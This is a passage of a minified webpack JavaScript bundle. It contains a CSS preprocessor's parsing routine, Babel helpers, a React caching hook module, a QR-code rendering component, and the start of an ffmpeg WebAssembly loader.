                                switch (g) {
                                    case 32:
                                    case 9:
                                    case 59:
                                    case 13:
                                    case 10:
                                        break;
                                    default:
                                        f += e.charAt(l);
                                }
                                g = 59;
                            }
                            switch (g) {
                                case 123:
                                    for (q = (f = f.trim()).charCodeAt(0), k = 1, t = ++l; l < B; ) {
                                        switch ((g = e.charCodeAt(l))) {
                                            case 123:
                                                k++;
                                                break;
                                            case 125:
                                                k--;
                                                break;
                                            case 47:
                                                switch ((g = e.charCodeAt(l + 1))) {
                                                    case 42:
                                                    case 47:
                                                        a: {
                                                            for (u = l + 1; u < J; ++u)
                                                                switch (e.charCodeAt(u)) {
                                                                    case 47:
                                                                        if (42 === g && 42 === e.charCodeAt(u - 1) && l + 2 !== u) {
                                                                            l = u + 1;
                                                                            break a;
                                                                        }
                                                                        break;
                                                                    case 10:
                                                                        if (47 === g) {
                                                                            l = u + 1;
                                                                            break a;
                                                                        }
                                                                }
                                                            l = u;
                                                        }
                                                }
                                                break;
                                            case 91:
                                                g++;
                                            case 40:
                                                g++;
                                            case 34:
                                            case 39:
                                                for (; l++ < J && e.charCodeAt(l) !== g; );
                                        }
                                        if (0 === k) break;
                                        l++;
                                    }
                                    switch (((k = e.substring(t, l)), 0 === q && (q = (f = f.replace(ca, "").trim()).charCodeAt(0)), q)) {
                                        case 64:
                                            switch ((0 < r && (f = f.replace(N, "")), (g = f.charCodeAt(1)))) {
                                                case 100:
                                                case 109:
                                                case 115:
                                                case 45:
                                                    r = c;
                                                    break;
                                                default:
                                                    r = O;
                                            }
                                            if (
                                                ((t = (k = M(c, r, k, g, a + 1)).length),
                                                0 < A && ((C = H(3, k, (r = X(O, f, I)), c, D, z, t, g, a, h)), (f = r.join("")), void 0 !== C && 0 === (t = (k = C.trim()).length) && ((g = 0), (k = ""))),
                                                0 < t)
                                            )
                                                switch (g) {
                                                    case 115:
                                                        f = f.replace(da, ea);
                                                    case 100:
                                                    case 109:
                                                    case 45:
                                                        k = f + "{" + k + "}";
                                                        break;
                                                    case 107:
                                                        (k = (f = f.replace(fa, "$1 $2")) + "{" + k + "}"), (k = 1 === w || (2 === w && L("@" + k, 3)) ? "@-webkit-" + k + "@" + k : "@" + k);
                                                        break;
                                                    default:
                                                        (k = f + k), 112 === h && ((p += k), (k = ""));
                                                }
                                            else k = "";
                                            break;
                                        default:
                                            k = M(c, X(c, f, I), k, h, a + 1);
                                    }
                                    (F += k), (k = I = r = u = q = 0), (f = ""), (g = e.charCodeAt(++l));
                                    break;
                                case 125:
                                case 59:
                                    if (1 < (t = (f = (0 < r ? f.replace(N, "") : f).trim()).length))
                                        switch (
                                            (0 === u && ((q = f.charCodeAt(0)), 45 === q || (96 < q && 123 > q)) && (t = (f = f.replace(" ", ":")).length),
                                            0 < A && void 0 !== (C = H(1, f, c, d, D, z, p.length, h, a, h)) && 0 === (t = (f = C.trim()).length) && (f = "\0\0"),
                                            (q = f.charCodeAt(0)),
                                            (g = f.charCodeAt(1)),
                                            q)
                                        ) {
                                            case 0:
                                                break;
                                            case 64:
                                                if (105 === g || 99 === g) {
                                                    G += f + e.charAt(l);
                                                    break;
                                                }
                                            default:
                                                58 !== f.charCodeAt(t - 1) && (p += P(f, q, g, f.charCodeAt(2)));
                                        }
                                    (I = r = u = q = 0), (f = ""), (g = e.charCodeAt(++l));
                            }
                        }
                        switch (g) {
                            case 13:
                            case 10:
                                47 === b ? (b = 0) : 0 === 1 + q && 107 !== h && 0 < f.length && ((r = 1), (f += "\0")), 0 < A * Y && H(0, f, c, d, D, z, p.length, h, a, h), (z = 1), D++;
                                break;
                            case 59:
                            case 125:
                                if (0 === b + n + v + m) {
                                    z++;
                                    break;
                                }
                            default:
                                switch ((z++, (y = e.charAt(l)), g)) {
                                    case 9:
                                    case 32:
                                        if (0 === n + m + b)
                                            switch (x) {
                                                case 44:
                                                case 58:
                                                case 9:
                                                case 32:
                                                    y = "";
                                                    break;
                                                default:
                                                    32 !== g && (y = " ");
                                            }
                                        break;
                                    case 0:
                                        y = "\\0";
                                        break;
                                    case 12:
                                        y = "\\f";
                                        break;
                                    case 11:
                                        y = "\\v";
                                        break;
                                    case 38:
                                        0 === n + b + m && ((r = I = 1), (y = "\f" + y));
                                        break;
                                    case 108:
                                        if (0 === n + b + m + E && 0 < u)
                                            switch (l - u) {
                                                case 2:
                                                    112 === x && 58 === e.charCodeAt(l - 3) && (E = x);
                                                case 8:
                                                    111 === K && (E = K);
                                            }
                                        break;
                                    case 58:
                                        0 === n + b + m && (u = l);
                                        break;
                                    case 44:
                                        0 === b + v + n + m && ((r = 1), (y += "\r"));
                                        break;
                                    case 34:
                                    case 39:
                                        0 === b && (n = n === g ? 0 : 0 === n ? g : n);
                                        break;
                                    case 91:
                                        0 === n + b + v && m++;
                                        break;
                                    case 93:
                                        0 === n + b + v && m--;
                                        break;
                                    case 41:
                                        0 === n + b + m && v--;
                                        break;
                                    case 40:
                                        if (0 === n + b + m) {
                                            if (0 === q)
                                                switch (2 * x + 3 * K) {
                                                    case 533:
                                                        break;
                                                    default:
                                                        q = 1;
                                                }
                                            v++;
                                        }
                                        break;
                                    case 64:
                                        0 === b + v + n + m + u + k && (k = 1);
                                        break;
                                    case 42:
                                    case 47:
                                        if (!(0 < n + m + v))
                                            switch (b) {
                                                case 0:
                                                    switch (2 * g + 3 * e.charCodeAt(l + 1)) {
                                                        case 235:
                                                            b = 47;
                                                            break;
                                                        case 220:
                                                            (t = l), (b = 42);
                                                    }
                                                    break;
                                                case 42:
                                                    47 === g && 42 === x && t + 2 !== l && (33 === e.charCodeAt(t + 2) && (p += e.substring(t, l + 1)), (y = ""), (b = 0));
                                            }
                                }
                                0 === b && (f += y);
                        }
                        (K = x), (x = g), l++;
                    }
                    if (0 < (t = p.length)) {
                        if (((r = c), 0 < A && void 0 !== (C = H(2, p, r, d, D, z, t, h, a, h)) && 0 === (p = C).length)) return G + p + F;
                        if (((p = r.join(",") + "{" + p + "}"), 0 != w * E)) {
                            switch ((2 !== w || L(p, 2) || (E = 0), E)) {
                                case 111:
                                    p = p.replace(ha, ":-moz-$1") + p;
                                    break;
                                case 112:
                                    p = p.replace(Q, "::-webkit-input-$1") + p.replace(Q, "::-moz-$1") + p.replace(Q, ":-ms-input-$1") + p;
                            }
                            E = 0;
                        }
                    }
                    return G + p + F;
                })(O, e, c, 0, 0);
                return 0 < A && void 0 !== (h = H(-2, a, e, e, D, z, a.length, 0, 0, 0)) && (a = h), "", (E = 0), (z = D = 1), a;
            }
            var ca = /^\0+/g,
                N = /[\0\r\f]/g,
                aa = /: */g,
                ka = /zoo|gra/,
                ma = /([,: ])(transform)/g,
                ia = /,\r+?/g,
                F = /([\t\r\n ])*\f?&/g,
                fa = /@(k\w+)\s*(\S*)\s*/,
                Q = /::(place)/g,
                ha = /:(read-only)/g,
                G = /[svh]\w+-[tblr]{2}/,
                da = /\(\s*(.*)\s*\)/g,
                oa = /([\s\S]*?);/g,
                ba = /-self|flex-/g,
                na = /[^]*?(:[rp][el]a[\w-]+)[^]*/,
                la = /stretch|:\s*\w+\-(?:conte|avail)/,
                ja = /([^-])(image-set\()/,
                z = 1,
                D = 1,
                E = 0,
                w = 1,
                O = [],
                S = [],
                A = 0,
                R = null,
                Y = 0;
            return (
                (B.use = function T(d) {
                    switch (d) {
                        case void 0:
                        case null:
                            A = S.length = 0;
                            break;
                        default:
                            if ("function" == typeof d) S[A++] = d;
                            else if ("object" == typeof d) for (var c = 0, e = d.length; c < e; ++c) T(d[c]);
                            else Y = 0 | !!d;
                    }
                    return T;
                }),
                (B.set = U),
                void 0 !== W && U(W),
                B
            );
        };
    },
    function (module, __webpack_exports__, __webpack_require__) {
        "use strict";
        __webpack_exports__.a = {
            animationIterationCount: 1,
            borderImageOutset: 1,
            borderImageSlice: 1,
            borderImageWidth: 1,
            boxFlex: 1,
            boxFlexGroup: 1,
            boxOrdinalGroup: 1,
            columnCount: 1,
            columns: 1,
            flex: 1,
            flexGrow: 1,
            flexPositive: 1,
            flexShrink: 1,
            flexNegative: 1,
            flexOrder: 1,
            gridRow: 1,
            gridRowEnd: 1,
            gridRowSpan: 1,
            gridRowStart: 1,
            gridColumn: 1,
            gridColumnEnd: 1,
            gridColumnSpan: 1,
            gridColumnStart: 1,
            msGridRow: 1,
            msGridRowSpan: 1,
            msGridColumn: 1,
            msGridColumnSpan: 1,
            fontWeight: 1,
            lineHeight: 1,
            opacity: 1,
            order: 1,
            orphans: 1,
            tabSize: 1,
            widows: 1,
            zIndex: 1,
            zoom: 1,
            WebkitLineClamp: 1,
            fillOpacity: 1,
            floodOpacity: 1,
            stopOpacity: 1,
            strokeDasharray: 1,
            strokeDashoffset: 1,
            strokeMiterlimit: 1,
            strokeOpacity: 1,
            strokeWidth: 1,
        };
    },
    function (module, exports, __webpack_require__) {
        var arrayWithHoles = __webpack_require__(169),
            iterableToArrayLimit = __webpack_require__(170),
            unsupportedIterableToArray = __webpack_require__(171),
            nonIterableRest = __webpack_require__(173);
        (module.exports = function (arr, i) {
            return arrayWithHoles(arr) || iterableToArrayLimit(arr, i) || unsupportedIterableToArray(arr, i) || nonIterableRest();
        }),
            (module.exports.__esModule = !0),
            (module.exports.default = module.exports);
    },
    function (module, exports) {
        (module.exports = function (instance, Constructor) {
            if (!(instance instanceof Constructor)) throw new TypeError("Cannot call a class as a function");
        }),
            (module.exports.__esModule = !0),
            (module.exports.default = module.exports);
    },
    function (module, exports) {
        function _defineProperties(target, props) {
            for (var i = 0; i < props.length; i++) {
                var descriptor = props[i];
                (descriptor.enumerable = descriptor.enumerable || !1), (descriptor.configurable = !0), "value" in descriptor && (descriptor.writable = !0), Object.defineProperty(target, descriptor.key, descriptor);
            }
        }
        (module.exports = function (Constructor, protoProps, staticProps) {
            return protoProps && _defineProperties(Constructor.prototype, protoProps), staticProps && _defineProperties(Constructor, staticProps), Object.defineProperty(Constructor, "prototype", { writable: !1 }), Constructor;
        }),
            (module.exports.__esModule = !0),
            (module.exports.default = module.exports);
    },
    function (module, exports, __webpack_require__) {
        module.exports = { parse: __webpack_require__(175), stringify: __webpack_require__(178) };
    },
    function (module, exports, __webpack_require__) {
        window,
            (module.exports = (function (e) {
                var t = {};
                function n(r) {
                    if (t[r]) return t[r].exports;
                    var o = (t[r] = { i: r, l: !1, exports: {} });
                    return e[r].call(o.exports, o, o.exports, n), (o.l = !0), o.exports;
                }
                return (
                    (n.m = e),
                    (n.c = t),
                    (n.d = function (e, t, r) {
                        n.o(e, t) || Object.defineProperty(e, t, { enumerable: !0, get: r });
                    }),
                    (n.r = function (e) {
                        "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, { value: "Module" }), Object.defineProperty(e, "__esModule", { value: !0 });
                    }),
                    (n.t = function (e, t) {
                        if ((1 & t && (e = n(e)), 8 & t)) return e;
                        if (4 & t && "object" == typeof e && e && e.__esModule) return e;
                        var r = Object.create(null);
                        if ((n.r(r), Object.defineProperty(r, "default", { enumerable: !0, value: e }), 2 & t && "string" != typeof e))
                            for (var o in e)
                                n.d(
                                    r,
                                    o,
                                    function (t) {
                                        return e[t];
                                    }.bind(null, o)
                                );
                        return r;
                    }),
                    (n.n = function (e) {
                        var t =
                            e && e.__esModule
                                ? function () {
                                      return e.default;
                                  }
                                : function () {
                                      return e;
                                  };
                        return n.d(t, "a", t), t;
                    }),
                    (n.o = function (e, t) {
                        return Object.prototype.hasOwnProperty.call(e, t);
                    }),
                    (n.p = "/"),
                    n((n.s = 1))
                );
            })([
                function (e, t) {
                    e.exports = __webpack_require__(0);
                },
                function (e, t, n) {
                    "use strict";
                    n.r(t);
                    var r = n(0),
                        o = n.n(r);
                    function u(e) {
                        const [t, n] = Object(r.useState)(!0),
                            [o, u] = Object(r.useState)();
                        return (
                            Object(r.useEffect)(() => {
                                let t = !0;
                                return (
                                    (async function () {
                                        const r = e();
                                        if (null === r) return;
                                        n(!0), u(void 0);
                                        const o = await r;
                                        t && (u(o), n(!1));
                                    })(),
                                    () => {
                                        t = !1;
                                    }
                                );
                            }, [e]),
                            { isFetching: t, data: o }
                        );
                    }
                    const c = {};
                    function i(e, t) {
                        const [n, o] = Object(r.useState)(0),
                            i = Object(r.useMemo)(() => ("string" == typeof t ? t : t()), [t]),
                            f = Object(r.useCallback)(
                                (e) => {
                                    (c[i] = Promise.resolve(e)), o(Date.now());
                                },
                                [i]
                            ),
                            a = Object(r.useCallback)(() => {
                                delete c[i], o(Date.now());
                            }, [i]),
                            s = Object(r.useCallback)(() => {
                                let t = c[i];
                                if (void 0 === t) {
                                    const n = e();
                                    if (null === n) return null;
                                    t = c[i] = n;
                                }
                                return t;
                            }, [i, n]),
                            { data: l, isFetching: d } = u(s);
                        return { isFetching: d, data: l, updateCache: f, removeCache: a };
                    }
                    const f = Object(r.createContext)({});
                    function a() {
                        return Object(r.useContext)(f);
                    }
                    function s({ store: e, children: t }) {
                        const [n, u] = Object(r.useState)({}),
                            c = Object.keys(e).reduce(
                                (t, n) => {
                                    const o = e[n];
                                    return (
                                        (t[n] = (...e) => {
                                            const t = [n, ...e].join("_"),
                                                c = i(() => o(...e), t);
                                            return (
                                                Object(r.useEffect)(() => {
                                                    !(function (e, t) {
                                                        u((n) => ({ ...n, [e]: t }));
                                                    })(t, c.removeCache);
                                                }, [t, c.removeCache]),
                                                c
                                            );
                                        }),
                                        t
                                    );
                                },
                                {
                                    clearCache(...e) {
                                        !(function (e) {
                                            const t = n[e];
                                            t && t();
                                        })([...e].join("_"));
                                    },
                                }
                            ),
                            a = f;
                        return o.a.createElement(a.Provider, { value: c }, t);
                    }
                    n.d(t, "useCache", function () {
                        return i;
                    }),
                        n.d(t, "usePromise", function () {
                            return u;
                        }),
                        n.d(t, "useStore", function () {
                            return a;
                        }),
                        n.d(t, "StoreProvider", function () {
                            return s;
                        }),
                        n.d(t, "StoreContext", function () {
                            return f;
                        });
                },
            ]));
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        function _typeof(obj) {
            return (_typeof =
                "function" == typeof Symbol && "symbol" == typeof Symbol.iterator
                    ? function (obj) {
                          return typeof obj;
                      }
                    : function (obj) {
                          return obj && "function" == typeof Symbol && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj;
                      })(obj);
        }
        function _extends() {
            return (_extends =
                Object.assign ||
                function (target) {
                    for (var i = 1; i < arguments.length; i++) {
                        var source = arguments[i];
                        for (var key in source) Object.prototype.hasOwnProperty.call(source, key) && (target[key] = source[key]);
                    }
                    return target;
                }).apply(this, arguments);
        }
        function ownKeys(object, enumerableOnly) {
            var keys = Object.keys(object);
            if (Object.getOwnPropertySymbols) {
                var symbols = Object.getOwnPropertySymbols(object);
                enumerableOnly &&
                    (symbols = symbols.filter(function (sym) {
                        return Object.getOwnPropertyDescriptor(object, sym).enumerable;
                    })),
                    keys.push.apply(keys, symbols);
            }
            return keys;
        }
        function _objectSpread(target) {
            for (var i = 1; i < arguments.length; i++) {
                var source = null != arguments[i] ? arguments[i] : {};
                i % 2
                    ? ownKeys(source, !0).forEach(function (key) {
                          _defineProperty(target, key, source[key]);
                      })
                    : Object.getOwnPropertyDescriptors
                    ? Object.defineProperties(target, Object.getOwnPropertyDescriptors(source))
                    : ownKeys(source).forEach(function (key) {
                          Object.defineProperty(target, key, Object.getOwnPropertyDescriptor(source, key));
                      });
            }
            return target;
        }
        function _objectWithoutProperties(source, excluded) {
            if (null == source) return {};
            var key,
                i,
                target = (function (source, excluded) {
                    if (null == source) return {};
                    var key,
                        i,
                        target = {},
                        sourceKeys = Object.keys(source);
                    for (i = 0; i < sourceKeys.length; i++) (key = sourceKeys[i]), excluded.indexOf(key) >= 0 || (target[key] = source[key]);
                    return target;
                })(source, excluded);
            if (Object.getOwnPropertySymbols) {
                var sourceSymbolKeys = Object.getOwnPropertySymbols(source);
                for (i = 0; i < sourceSymbolKeys.length; i++) (key = sourceSymbolKeys[i]), excluded.indexOf(key) >= 0 || (Object.prototype.propertyIsEnumerable.call(source, key) && (target[key] = source[key]));
            }
            return target;
        }
        function _classCallCheck(instance, Constructor) {
            if (!(instance instanceof Constructor)) throw new TypeError("Cannot call a class as a function");
        }
        function _defineProperties(target, props) {
            for (var i = 0; i < props.length; i++) {
                var descriptor = props[i];
                (descriptor.enumerable = descriptor.enumerable || !1), (descriptor.configurable = !0), "value" in descriptor && (descriptor.writable = !0), Object.defineProperty(target, descriptor.key, descriptor);
            }
        }
        function _createClass(Constructor, protoProps, staticProps) {
            return protoProps && _defineProperties(Constructor.prototype, protoProps), staticProps && _defineProperties(Constructor, staticProps), Constructor;
        }
        function _possibleConstructorReturn(self, call) {
            return !call || ("object" !== _typeof(call) && "function" != typeof call) ? _assertThisInitialized(self) : call;
        }
        function _getPrototypeOf(o) {
            return (_getPrototypeOf = Object.setPrototypeOf
                ? Object.getPrototypeOf
                : function (o) {
                      return o.__proto__ || Object.getPrototypeOf(o);
                  })(o);
        }
        function _assertThisInitialized(self) {
            if (void 0 === self) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return self;
        }
        function _inherits(subClass, superClass) {
            if ("function" != typeof superClass && null !== superClass) throw new TypeError("Super expression must either be null or a function");
            (subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, writable: !0, configurable: !0 } })), superClass && _setPrototypeOf(subClass, superClass);
        }
        function _setPrototypeOf(o, p) {
            return (_setPrototypeOf =
                Object.setPrototypeOf ||
                function (o, p) {
                    return (o.__proto__ = p), o;
                })(o, p);
        }
        function _defineProperty(obj, key, value) {
            return key in obj ? Object.defineProperty(obj, key, { value: value, enumerable: !0, configurable: !0, writable: !0 }) : (obj[key] = value), obj;
        }
        var React = __webpack_require__(0),
            QRCodeImpl = (__webpack_require__(30), __webpack_require__(184)),
            ErrorCorrectLevel = __webpack_require__(78);
        function convertStr(str) {
            for (var out = "", i = 0; i < str.length; i++) {
                var charcode = str.charCodeAt(i);
                charcode < 128
                    ? (out += String.fromCharCode(charcode))
                    : charcode < 2048
                    ? ((out += String.fromCharCode(192 | (charcode >> 6))), (out += String.fromCharCode(128 | (63 & charcode))))
                    : charcode < 55296 || charcode >= 57344
                    ? ((out += String.fromCharCode(224 | (charcode >> 12))), (out += String.fromCharCode(128 | ((charcode >> 6) & 63))), (out += String.fromCharCode(128 | (63 & charcode))))
                    : (i++,
                      (charcode = 65536 + (((1023 & charcode) << 10) | (1023 & str.charCodeAt(i)))),
                      (out += String.fromCharCode(240 | (charcode >> 18))),
                      (out += String.fromCharCode(128 | ((charcode >> 12) & 63))),
                      (out += String.fromCharCode(128 | ((charcode >> 6) & 63))),
                      (out += String.fromCharCode(128 | (63 & charcode))));
            }
            return out;
        }
        var DEFAULT_PROPS = { size: 128, level: "L", bgColor: "#FFFFFF", fgColor: "#000000", includeMargin: !1 };
        function generatePath(modules) {
            var margin = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0,
                ops = [];
            return (
                modules.forEach(function (row, y) {
                    var start = null;
                    row.forEach(function (cell, x) {
                        if (!cell && null !== start)
                            return (
                                ops.push(
                                    "M"
                                        .concat(start + margin, " ")
                                        .concat(y + margin, "h")
                                        .concat(x - start, "v1H")
                                        .concat(start + margin, "z")
                                ),
                                void (start = null)
                            );
                        if (x !== row.length - 1) cell && null === start && (start = x);
                        else {
                            if (!cell) return;
                            null === start
                                ? ops.push(
                                      "M"
                                          .concat(x + margin, ",")
                                          .concat(y + margin, " h1v1H")
                                          .concat(x + margin, "z")
                                  )
                                : ops.push(
                                      "M"
                                          .concat(start + margin, ",")
                                          .concat(y + margin, " h")
                                          .concat(x + 1 - start, "v1H")
                                          .concat(start + margin, "z")
                                  );
                        }
                    });
                }),
                ops.join("")
            );
        }
        function excavateModules(modules, excavation) {
            return modules.slice().map(function (row, y) {
                return y < excavation.y || y >= excavation.y + excavation.h
                    ? row
                    : row.map(function (cell, x) {
                          return (x < excavation.x || x >= excavation.x + excavation.w) && cell;
                      });
            });
        }
        function getImageSettings(props, cells) {
            var imageSettings = props.imageSettings,
                size = props.size,
                includeMargin = props.includeMargin;
            if (null == imageSettings) return null;
            var margin = includeMargin ? 4 : 0,
                numCells = cells.length + 2 * margin,
                defaultSize = Math.floor(0.1 * size),
                scale = numCells / size,
                w = (imageSettings.width || defaultSize) * scale,
                h = (imageSettings.height || defaultSize) * scale,
                x = null == imageSettings.x ? cells.length / 2 - w / 2 : imageSettings.x * scale,
                y = null == imageSettings.y ? cells.length / 2 - h / 2 : imageSettings.y * scale,
                excavation = null;
            if (imageSettings.excavate) {
                var floorX = Math.floor(x),
                    floorY = Math.floor(y);
                excavation = { x: floorX, y: floorY, w: Math.ceil(w + x - floorX), h: Math.ceil(h + y - floorY) };
            }
            return { x: x, y: y, h: h, w: w, excavation: excavation };
        }
        var SUPPORTS_PATH2D = (function () {
                try {
                    new Path2D().addPath(new Path2D());
                } catch (e) {
                    return !1;
                }
                return !0;
            })(),
            QRCodeCanvas = (function (_React$PureComponent) {
                function QRCodeCanvas() {
                    var _getPrototypeOf2, _this;
                    _classCallCheck(this, QRCodeCanvas);
                    for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) args[_key] = arguments[_key];
                    return (
                        _defineProperty(_assertThisInitialized((_this = _possibleConstructorReturn(this, (_getPrototypeOf2 = _getPrototypeOf(QRCodeCanvas)).call.apply(_getPrototypeOf2, [this].concat(args))))), "_canvas", void 0),
                        _defineProperty(_assertThisInitialized(_this), "_image", void 0),
                        _defineProperty(_assertThisInitialized(_this), "state", { imgLoaded: !1 }),
                        _defineProperty(_assertThisInitialized(_this), "handleImageLoad", function () {
                            _this.setState({ imgLoaded: !0 });
                        }),
                        _this
                    );
                }
                return (
                    _inherits(QRCodeCanvas, _React$PureComponent),
                    _createClass(QRCodeCanvas, [
                        {
                            key: "componentDidMount",
                            value: function () {
                                this._image && this._image.complete && this.handleImageLoad(), this.update();
                            },
                        },
                        {
                            key: "componentWillReceiveProps",
                            value: function (nextProps) {
                                var _this$props$imageSett, _nextProps$imageSetti;
                                (null === (_this$props$imageSett = this.props.imageSettings) || void 0 === _this$props$imageSett ? void 0 : _this$props$imageSett.src) !==
                                    (null === (_nextProps$imageSetti = nextProps.imageSettings) || void 0 === _nextProps$imageSetti ? void 0 : _nextProps$imageSetti.src) && this.setState({ imgLoaded: !1 });
                            },
                        },
                        {
                            key: "componentDidUpdate",
                            value: function () {
                                this.update();
                            },
                        },
                        {
                            key: "update",
                            value: function () {
                                var _this$props = this.props,
                                    value = _this$props.value,
                                    size = _this$props.size,
                                    level = _this$props.level,
                                    bgColor = _this$props.bgColor,
                                    fgColor = _this$props.fgColor,
                                    includeMargin = _this$props.includeMargin,
                                    imageSettings = _this$props.imageSettings,
                                    qrcode = new QRCodeImpl(-1, ErrorCorrectLevel[level]);
                                if ((qrcode.addData(convertStr(value)), qrcode.make(), null != this._canvas)) {
                                    var canvas = this._canvas,
                                        ctx = canvas.getContext("2d");
                                    if (!ctx) return;
                                    var cells = qrcode.modules;
                                    if (null === cells) return;
                                    var margin = includeMargin ? 4 : 0,
                                        numCells = cells.length + 2 * margin,
                                        calculatedImageSettings = getImageSettings(this.props, cells);
                                    null != imageSettings && null != calculatedImageSettings && null != calculatedImageSettings.excavation && (cells = excavateModules(cells, calculatedImageSettings.excavation));
                                    var pixelRatio = window.devicePixelRatio || 1;
                                    canvas.height = canvas.width = size * pixelRatio;
                                    var scale = (size / numCells) * pixelRatio;
                                    ctx.scale(scale, scale),
                                        (ctx.fillStyle = bgColor),
                                        ctx.fillRect(0, 0, numCells, numCells),
                                        (ctx.fillStyle = fgColor),
                                        SUPPORTS_PATH2D
                                            ? ctx.fill(new Path2D(generatePath(cells, margin)))
                                            : cells.forEach(function (row, rdx) {
                                                  row.forEach(function (cell, cdx) {
                                                      cell && ctx.fillRect(cdx + margin, rdx + margin, 1, 1);
                                                  });
                                              }),
                                        this.state.imgLoaded &&
                                            this._image &&
                                            null != calculatedImageSettings &&
                                            ctx.drawImage(this._image, calculatedImageSettings.x + margin, calculatedImageSettings.y + margin, calculatedImageSettings.w, calculatedImageSettings.h);
                                }
                            },
                        },
                        {
                            key: "render",
                            value: function () {
                                var _this2 = this,
                                    _this$props2 = this.props,
                                    size = (_this$props2.value, _this$props2.size),
                                    style = (_this$props2.level, _this$props2.bgColor, _this$props2.fgColor, _this$props2.style),
                                    imageSettings = (_this$props2.includeMargin, _this$props2.imageSettings),
                                    otherProps = _objectWithoutProperties(_this$props2, ["value", "size", "level", "bgColor", "fgColor", "style", "includeMargin", "imageSettings"]),
                                    canvasStyle = _objectSpread({ height: size, width: size }, style),
                                    img = null,
                                    imgSrc = imageSettings && imageSettings.src;
                                return (
                                    null != imageSettings &&
                                        null != imgSrc &&
                                        (img = React.createElement("img", {
                                            src: imgSrc,
                                            style: { display: "none" },
                                            onLoad: this.handleImageLoad,
                                            ref: function (_ref) {
                                                return (_this2._image = _ref);
                                            },
                                        })),
                                    React.createElement(
                                        React.Fragment,
                                        null,
                                        React.createElement(
                                            "canvas",
                                            _extends(
                                                {
                                                    style: canvasStyle,
                                                    height: size,
                                                    width: size,
                                                    ref: function (_ref2) {
                                                        return (_this2._canvas = _ref2);
                                                    },
                                                },
                                                otherProps
                                            )
                                        ),
                                        img
                                    )
                                );
                            },
                        },
                    ]),
                    QRCodeCanvas
                );
            })(React.PureComponent);
        _defineProperty(QRCodeCanvas, "defaultProps", DEFAULT_PROPS);
        var QRCodeSVG = (function (_React$PureComponent2) {
            function QRCodeSVG() {
                return _classCallCheck(this, QRCodeSVG), _possibleConstructorReturn(this, _getPrototypeOf(QRCodeSVG).apply(this, arguments));
            }
            return (
                _inherits(QRCodeSVG, _React$PureComponent2),
                _createClass(QRCodeSVG, [
                    {
                        key: "render",
                        value: function () {
                            var _this$props3 = this.props,
                                value = _this$props3.value,
                                size = _this$props3.size,
                                level = _this$props3.level,
                                bgColor = _this$props3.bgColor,
                                fgColor = _this$props3.fgColor,
                                includeMargin = _this$props3.includeMargin,
                                imageSettings = _this$props3.imageSettings,
                                otherProps = _objectWithoutProperties(_this$props3, ["value", "size", "level", "bgColor", "fgColor", "includeMargin", "imageSettings"]),
                                qrcode = new QRCodeImpl(-1, ErrorCorrectLevel[level]);
                            qrcode.addData(convertStr(value)), qrcode.make();
                            var cells = qrcode.modules;
                            if (null === cells) return null;
                            var margin = includeMargin ? 4 : 0,
                                numCells = cells.length + 2 * margin,
                                calculatedImageSettings = getImageSettings(this.props, cells),
                                image = null;
                            null != imageSettings &&
                                null != calculatedImageSettings &&
                                (null != calculatedImageSettings.excavation && (cells = excavateModules(cells, calculatedImageSettings.excavation)),
                                (image = React.createElement("image", {
                                    xlinkHref: imageSettings.src,
                                    height: calculatedImageSettings.h,
                                    width: calculatedImageSettings.w,
                                    x: calculatedImageSettings.x + margin,
                                    y: calculatedImageSettings.y + margin,
                                    preserveAspectRatio: "none",
                                })));
                            var fgPath = generatePath(cells, margin);
                            return React.createElement(
                                "svg",
                                _extends({ shapeRendering: "crispEdges", height: size, width: size, viewBox: "0 0 ".concat(numCells, " ").concat(numCells) }, otherProps),
                                React.createElement("path", { fill: bgColor, d: "M0,0 h".concat(numCells, "v").concat(numCells, "H0z") }),
                                React.createElement("path", { fill: fgColor, d: fgPath }),
                                image
                            );
                        },
                    },
                ]),
                QRCodeSVG
            );
        })(React.PureComponent);
        _defineProperty(QRCodeSVG, "defaultProps", DEFAULT_PROPS);
        var QRCode = function (props) {
            var renderAs = props.renderAs,
                otherProps = _objectWithoutProperties(props, ["renderAs"]),
                Component = "svg" === renderAs ? QRCodeSVG : QRCodeCanvas;
            return React.createElement(Component, otherProps);
        };
        (QRCode.defaultProps = _objectSpread({ renderAs: "canvas" }, DEFAULT_PROPS)), (module.exports = QRCode);
    },
    function (module, exports, __webpack_require__) {
        (function (__filename, process, __dirname, Buffer) {
            var _scriptDir,
                createFFmpegCore =
                    ((_scriptDir = (_scriptDir = "undefined" != typeof document && document.currentScript ? document.currentScript.src : void 0) || __filename),
                    function (createFFmpegCore) {
                        var readyPromiseResolve,
                            readyPromiseReject,
                            Module = void 0 !== (createFFmpegCore = createFFmpegCore || {}) ? createFFmpegCore : {};
                        (Module.ready = new Promise(function (resolve, reject) {
                            (readyPromiseResolve = resolve), (readyPromiseReject = reject);
                        })),
                            (Module.quit = function (status) {
                                throw (Module.onExit && Module.onExit(status), new ExitStatus(status));
                            }),
                            (Module.exit = exit),
                            window.ffmpegWasmBinary && (Module.wasmBinary = window.ffmpegWasmBinary),
                            (out = err = function () {});
                        var key,
                            moduleOverrides = {};
                        for (key in Module) Module.hasOwnProperty(key) && (moduleOverrides[key] = Module[key]);
                        var arguments_ = [],
                            thisProgram = "./this.program",
                            quit_ = function (status, toThrow) {
                                throw toThrow;
                            },
                            ENVIRONMENT_IS_WEB = !1,
                            ENVIRONMENT_IS_WORKER = !1,
                            ENVIRONMENT_IS_NODE = !1,
                            ENVIRONMENT_IS_SHELL = !1;
                        (ENVIRONMENT_IS_WEB = "object" == typeof window),
                            (ENVIRONMENT_IS_WORKER = "function" == typeof importScripts),
                            (ENVIRONMENT_IS_NODE = "object" == typeof process && "object" == typeof process.versions && "string" == typeof process.versions.node),
                            (ENVIRONMENT_IS_SHELL = !ENVIRONMENT_IS_WEB && !ENVIRONMENT_IS_NODE && !ENVIRONMENT_IS_WORKER);
                        var read_,
                            readAsync,
                            readBinary,
                            nodeFS,
                            nodePath,
                            scriptDirectory = "";
                        function locateFile(path) {
                            return Module.locateFile ? Module.locateFile(path, scriptDirectory) : scriptDirectory + path;
                        }
                        ENVIRONMENT_IS_NODE
